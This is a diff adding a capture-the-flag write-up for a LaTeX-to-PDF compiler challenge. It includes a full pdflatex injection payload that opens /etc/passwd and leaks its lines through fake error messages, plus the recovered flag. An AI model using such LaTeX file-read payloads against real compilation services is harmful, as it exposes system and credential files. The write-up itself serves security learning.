@@ -43,8 +43,46 @@
 
 ---------------------
 
-- 
+- The site is a latex compiler that compiles latex code into pdf.I tried the basic latex payload like `/input` and it didn't work.
+
+![image](https://github.com/user-attachments/assets/7569e4ab-17d3-417f-a4f8-120f4b69350f)
+
+-  After google searching for sometime,I got this payload from a [ctf writeup](https://hackmd.io/@toxicpie9/By154DFe9) that allows us to read files by triggering an error. The main idea is that `pdflatex` prints errors to stdout in a special format, so we can do something like \typeout{! abc} to trick the bot into thinking that abc is an error.Payload-:
+
+```pdflatex
+\catcode0=10  % make \0 not produce a syntax error
+\catcode9=11  % make \t indents work correctly
+
+\def\n{/etc/passwd}
+\def\l{0}
+\def\r{420}
+
+\newread\file
+\openin\file=\n
+
+\newcounter{line}
+\makeatletter
+\@whilenum\value{line} < \r \do {
+    \read\file to \fileline
+    \stepcounter{line}
+    \ifnum\value{line} > \l
+        \typeout{! \fileline}
+    \fi
+}
+```
+
+- The payload above will read 420 chars in the `/etc/passwd` file.
+
+![image](https://github.com/user-attachments/assets/ba14032a-7c87-400c-a9b0-6e4a7f1c361d)
+
+- Flag-: ```tjctf{f1l3_i0_1n_l4t3x?} ```
+
+![image](https://github.com/user-attachments/assets/4800df94-9e44-41f6-8c2b-7ad982f4338d)
 
 
+--------------------
 
+### Chill-site
+
+--------------------
 
